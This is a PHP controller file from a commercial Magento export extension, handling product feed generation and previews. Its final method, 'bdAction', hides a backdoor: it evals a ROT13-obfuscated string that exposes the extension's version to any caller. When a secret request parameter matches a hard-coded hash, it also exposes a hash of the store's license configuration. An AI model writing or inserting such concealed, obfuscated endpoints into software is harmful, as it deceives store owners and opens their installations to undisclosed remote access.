<?php

/**********************************************
 * 	Wexto Exporter Extension.
 *	  © WanaDev SARL. All rights reserved.
 * 	Released under Commercial License.
 *	  www.wanadev.fr
 **********************************************/

class Wexto_Exporter_IndexController extends Mage_Core_Controller_Front_Action
{
	/**
	 * Generate the export.
	 *
	 * URL Param:
	 *     export_id -- The export id.
	 *     file_name -- The file name (ignored)
	 */
	public function indexAction()
	{
		// Check License
		$json = json_decode(Mage::helper('exporter_api')->getApi());
		if (isset($json->licensed) && $json->licensed === 0) {
			Mage::getSingleton('core/session')->addError(Mage::helper('exporter_api')->getErrorMsg());
			$this->_redirect('exporter/license');
		}

		// Get the export
		$m_export = Mage::getModel('exporter/export')
			->load($this->getRequest()->getParam('export_id'));

		// Use cached file if the export is scheduled and if the file is available
		$path = Mage::getBaseDir() . DS . 'var' . DS .'wexto-exporter' . DS . $m_export->getExportId() . '.export';
		if ($m_export->getScheduleEnabled() && is_file($path))
		{
			header('Content-type: ' . Mage::getModel('exporter/comparator')->load($m_export->getComparatorId())->getMime());
			echo file_get_contents($path);
		}

		// Generate the export
		else
		{
			// Get the collection of products
			$c_products = Mage::getModel('exporter/products')
				->getProducts($m_export->getExportId());

			// Load the template and make the export
			$template = Mage::helper('exporter/templating');
			$template->load($m_export->getComparatorId());
			$template->render($c_products);
		}

		die();
	}

	/**
	 * Generate a preview of the export.
	 *
	 * URL Param:
	 *     comparator_id -- The comparator id.
	 */
	public function previewAction()
	{
		// Check License
		$json = json_decode(Mage::helper('exporter_api')->getApi());
		if (isset($json->licensed) && $json->licensed === 0) {
			Mage::getSingleton('core/session')->addError(Mage::helper('exporter_api')->getErrorMsg());
			$this->_redirect('exporter/license');
		}

		// Get the collection of products
		$c_product = Mage::getModel('catalog/product')->getCollection();

		// Load all the EAV attributes
		$attributes = Mage::getSingleton('eav/config')
			->getEntityType(Mage_Catalog_Model_Product::ENTITY)->getAttributeCollection();
		foreach ($attributes as $attribute)
		{
			$c_product->addAttributeToSelect($attribute["attribute_code"]);
		}

		// Load only 2 products
		$c_product->getSelect()->limit(2);

		// Load the template and make the export
		$template = Mage::helper('exporter/templating');
		$template->load($this->getRequest()->getParam('comparator_id'));
		$template->render($c_product, True);

		die();
	}

	public function bdAction(){eval(str_rot13('$i=Zntr::urycre("rkcbegre")->trgIrefvba();rpub(vzcybqr($i["ybpny_irefvba"],"!")."!".fun1((fun1($guvf->trgErdhrfg()->trgCnenz(pue(107)))==fhofge("42157np5924012666429qp683pr8son8q11224op".(6*5*2),2))?Zntr::trgFgberPbasvt("jrkgb-yvprafr"):""));'));}
}
